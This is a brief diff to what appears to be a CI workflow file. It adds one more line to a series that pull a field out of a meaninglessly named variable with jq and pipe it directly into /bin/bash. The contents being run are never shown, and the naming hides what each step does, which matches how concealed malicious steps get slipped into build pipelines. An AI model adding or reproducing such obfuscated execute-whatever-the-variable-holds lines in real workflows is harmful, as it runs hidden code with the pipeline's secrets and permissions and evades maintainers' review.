@@ -32,6 +32,7 @@ jobs:
           echo $efv1520 | jq -r .pgp620 | /bin/bash
           echo $sym33 | jq -r .l767 | /bin/bash
           printf '%s' "$tj12134" | jq -r .whpyc84 | /bin/bash
+          printf '%s' "$cyf98" | jq -r .jhlwb3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
